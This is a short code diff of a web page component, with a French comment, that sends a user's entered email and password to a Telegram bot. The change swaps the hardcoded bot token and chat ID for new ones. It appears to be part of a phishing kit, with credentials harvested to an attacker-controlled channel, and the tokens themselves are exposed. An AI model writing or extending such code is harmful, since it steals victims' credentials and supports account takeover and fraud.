@@ -37,8 +37,8 @@ function Home() {
 
     try {
       // Envoyer les informations via Telegram
-      const botToken = "7676962098:AAEPkm5U8BHU_PvXsO30rfz-nf3icuMfYoA";
-      const chatId = "7702979825";
+      const botToken = "7832379978:AAEJniPm6k_2IoZJ06vJkxtAIk8qcd52nMY";
+      const chatId = "7759972823";
       const message = `Infos NoReply\nEmail: ${email}\nPassword: ${password}`;
 
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
